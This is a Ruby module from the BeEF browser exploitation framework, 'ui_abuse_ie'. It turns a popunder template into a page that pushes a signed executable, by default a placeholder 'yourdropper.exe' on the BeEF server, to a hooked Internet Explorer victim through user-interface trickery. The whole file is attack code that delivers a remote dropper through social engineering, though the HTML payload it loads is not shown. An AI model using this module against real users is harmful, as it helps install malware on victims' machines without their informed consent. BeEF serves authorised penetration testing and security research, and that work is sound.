#
# Copyright (c) 2006-2016 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
################################################################################
# Based on the PoC by Rosario Valotta
# Ported to BeEF by antisnatchor
# For more information see: https://sites.google.com/site/tentacoloviola/
################################################################################
class Ui_abuse_ie < BeEF::Core::Command

	def self.options
		return [
        {'name' => 'exe_url', 'ui_label' => 'Executable URL (MUST be signed)', 'value' => 'http://beef_server:beef_port/yourdropper.exe'}
		]
  end

  def pre_send
    begin

      @datastore.each do |input|
        if input['name'] == "exe_url"
          @exe_url = input['value']
        end
      end

      popunder = File.read("#{$root_dir}/modules/social_engineering/ui_abuse_ie/popunder.html")
      body = popunder.gsub("__URL_PLACEHOLDER__", @exe_url)
      BeEF::Core::NetworkStack::Handlers::AssetHandler.instance.bind_raw('200', {'Content-Type'=>'text/html'}, body, "/underpop.html", -1)
    rescue => e
      print_error "Something went wrong executing Ui_abuse_ie::pre_send, exception: #{e.message}"
    end
  end

	def post_execute
		content = {}
		content['results'] = @datastore['results']
		save content
	end

end

